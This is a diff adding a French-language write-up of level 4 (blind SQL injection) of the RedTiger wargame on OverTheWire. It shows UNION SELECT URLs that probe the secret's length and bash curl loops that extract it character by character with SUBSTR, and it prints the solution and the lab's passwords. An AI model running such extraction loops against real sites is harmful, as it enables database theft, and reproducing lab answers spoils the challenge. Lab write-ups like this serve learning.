@@ -85,6 +85,45 @@ curl --insecure -b level3login=securitycat_says_meow_and_likes_cheese https://re
  The password for the next level is: dont_publish_solutions_GRR! 
  
 4. Level 4 : Blind Injection
+   Identification de la taille du mot à trouver
+```
+https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C10
+=> 2 rows
+https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C20
+=> 1 row ==> taille entre 10 et 20 caractères
+https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29=17
+=> mot de 17 caractères
+
+on devine maintenant le mot
+for i in {1..17}; do
+	for x in {a..z}; do 
+	curl --insecure -b level4login=dont_publish_solutions_GRR%21 "https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,$i,1)='$x'" 2>/dev/null |grep "2 rows"
+	rc=$?
+	if [[ $rc == 0 ]] ; then
+		echo $x
+		break;
+	fi
+
+	done
+done
+manque les derniers caractères :-(
+
+for i in {14..17}; do
+	for x in {0..9}; do
+	curl --insecure -b level4login=dont_publish_solutions_GRR%21 "https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,$i,1)='$x'" 2>/dev/null |grep "2 rows"
+	rc=$?
+	if [[ $rc == 0 ]] ; then
+		echo $x
+		break;
+	fi
+
+	done
+done
+
+==> blindinjection123
+```
+ Word correct. 
+ The password for the next level is: bananas_are_not_yellow-sometimes 
 5. Level 5 : Advanced login-bypass
 6. Level 6 : SQL-Injection
 7. Level 7 : SQL-Injection
